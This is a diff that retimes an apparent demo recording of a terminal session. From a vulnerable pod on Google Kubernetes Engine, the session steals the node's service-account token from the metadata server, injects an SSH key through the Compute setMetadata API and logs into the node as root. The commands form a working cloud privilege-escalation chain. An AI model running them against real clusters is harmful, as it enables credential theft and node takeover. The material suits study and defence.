@@ -19,7 +19,7 @@
       "curl -s -H \"X-Google-Metadata-Request: True\" http://metad \rata.google.internal/0.1/meta-data/network"
     ],
     [
-      3.0,
+      1.0,
       "\r\n"
     ],
     [
@@ -47,7 +47,7 @@
       "/projects/gkek8s-178117/zones/us-east1 \r-b/instances"
     ],
     [
-      3.0,
+      1.0,
       "\r\n"
     ],
     [
@@ -271,7 +271,7 @@
       "aswell\",\r\n   \"labels\": {\r\n    \"goog-gke-node\": \"\"\r\n   },\r\n   \"labelFingerprint\": \"2ixRno2sGuM=\",\r\n   \"startRestricted\": false,\r\n   \"deletionProtection\": false\r\n  }\r\n ],\r\n \"selfLink\": \"https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances\"\r\n}\r\nroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      1.0,
+      0.7,
       "curl -s -H \"Metadata-Flavor: Google\" -H \"Authorization\":\"B\rBearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-accou\runts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print $4}')\" -H \"Accept: appl\rlication/json\" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-\r-b/instances"
     ],
     [
@@ -1763,7 +1763,7 @@
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      1.0,
+      0.6,
       "curl -s -H \"Metadata-Flavor: Google\" -H \"Authorization\":\" \rBearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/instance/service-acco \runts/default/token\" -H \"Metadata-Flavor: Google\" | awk"
     ],
     [
@@ -1775,7 +1775,7 @@
       "-F\\\" '{print $4}')\" -H \"Accept: app \rlication/json\" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1 \r-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | less"
     ],
     [
-      2.676643,
+      1.676643,
       "\r\n\u001b[?1049h\u001b[?1h\u001b=\r"
     ],
     [
@@ -2043,7 +2043,7 @@
       "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      1.0,
+      0.5,
       "export FINGERPRINT=$(curl -s -H \"Metadata-Flavor: Google\" \r -H \"Authorization\":\"Bearer $(curl -s \"http://metadata.google.internal/computeMetadata/v1/ \rinstance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print $ \r4}')\" -H \"Accept: application/json\" "
     ],
     [
@@ -2055,7 +2055,7 @@
       "tps://www.googleapis.com/compute/v1/projects/gkek8s- \r178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | grep fing \rer | tail -1 | cut -d'\"' -f4)"
     ],
     [
-      3.211249,
+      1.211249,
       "\r\n"
     ],
     [
@@ -2187,7 +2187,7 @@
       "RtMeA/h5opdNMJlISZnVy5gQDwIaYRY73 \rG+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\"\r\n>    }\r\n>   ]\r\n> }\r\n> \r\n> EOF"
     ],
     [
-      3.050277,
+      1.550277,
       "\r\n"
     ],
     [
@@ -2275,7 +2275,7 @@
       "\r\n{\r\n  \"fingerprint\": \"unGNa8J40OI=\",\r\n  \"items\": [\r\n   {\r\n    \"key\": \"sshKeys\",\r\n    \"value\": \"geese:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYNealSvTy/g9aHyHTKe0xy2WIVmKPBqXVxmWyPObqfZJd0tWOw2JKoWb2m7V69haSa57SxF2f3Aap70BHhi+TjW//ZNHzE8jFyS/vf9e3CNSfFXlNY25cVbPc+b+EXl+pf96ubIt4WtnsoxuoZN06nC3UHeAWXIh8XJ6TakqjyTzy612ZmDQQuQ9qDjPaeGbJbzDytYdSxuSl5mTlG4hu87VsZlPHXXISfE7RPNSLQ3Kc+hfJkgEtGY/CexkIPgJTJBaI7znUyRtMeA/h5opdNMJlISZnVy5gQDwIaYRY73G+oWTh0cVH0cHRGhKYkIB+t8RHNyDA+EkLEObicbRF\"\r\n   }\r\n  ]\r\n}\r\n\r\nroot@vulnweb-2569941405-qgpg1:/# "
     ],
     [
-      3.0,
+      1.5,
       "curl -X POST -d \"@metadata\" -s -H \"Metadata-Flavor: Googl \re\" -H \"Authorization\":\"Bearer $(curl -s \"http://metadata.google.internal/computeMetadata/v \r1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\" | awk -F\\\" '{print \r $4}')\" -H \"Content-type: application/json\" https://www.googleapis.com/compute/v1/projects \r/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc/set \rMetadata"
     ],
     [
@@ -2319,7 +2319,7 @@
       "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ],
     [
-      1.0,
+      0.6,
       "ssh"
     ],
     [
@@ -2515,7 +2515,7 @@
       "\u001b]0;root@gke-gke-1-7-8-gce-default-pool-77395b66-cncc:/home/geese\u0007\u001b[01;31mgke-gke-1-7-8-gce-default-pool-77395b66-cncc\u001b[01;34m geese #\u001b[00m "
     ],
     [
-      2.0,
+      1.0,
       "l"
     ],
     [
@@ -2619,7 +2619,7 @@
       "\u001b]0;root@gke-gke-1-7-8-gce-default-pool-77395b66-cncc:/home/geese\u0007\u001b[01;31mgke-gke-1-7-8-gce-default-pool-77395b66-cncc\u001b[01;34m geese #\u001b[00m "
     ],
     [
-      1.887904,
+      1.087904,
       "d"
     ],
     [
@@ -2705,26 +2705,6 @@
     [
       0.000136,
       "                                                                           \"/pause\"                 About an hour ago   Up About an hour                        k8s_POD_fluentd-gcp-v2.0.9-tv7wx_kube-system_379ce1f3-ba66-11e7-bce2-42010a8e0100_0\r\n99e5d1150083        gcr.io/google_containers/pause-amd64:3.0                                                                                                 \"/pause\"                 About an hour ago   Up About an hour                        k8s_POD_kube-proxy-gke-gke-1-7-8-gce-default-pool-77395b66-cncc_kube-system_a3e4a2463b819267c6444c3990943d6a_0\r\n\u001b]0;root@gke-gke-1-7-8-gce-default-pool-77395b66-cncc:/home/geese\u0007\u001b[01;31mgke-gke-1-7-8-gce-default-pool-77395b66-cncc\u001b[01;34m geese #\u001b[00m "
-    ],
-    [
-      2.0,
-      "exit\r\n\u001b]0;geese@gke-gke-1-7-8-gce-default-pool-77395b66-cncc:~\u0007\u001b[01;32mgeese@gke-gke-1-7-8-gce-default-pool-77395b66-cncc\u001b[01;34m ~ $\u001b[00m "
-    ],
-    [
-      0.391216,
-      "logout\r\n"
-    ],
-    [
-      0.002007,
-      "\u001b[H\u001b[2J"
-    ],
-    [
-      0.001582,
-      "Connection to 35.185.32.11 closed.\r\r\n"
-    ],
-    [
-      0.011835,
-      "\u001b]0;geese@mb: ~\u0007\u001b[0;32m~\u001b[0m$ "
     ]
   ]
 }
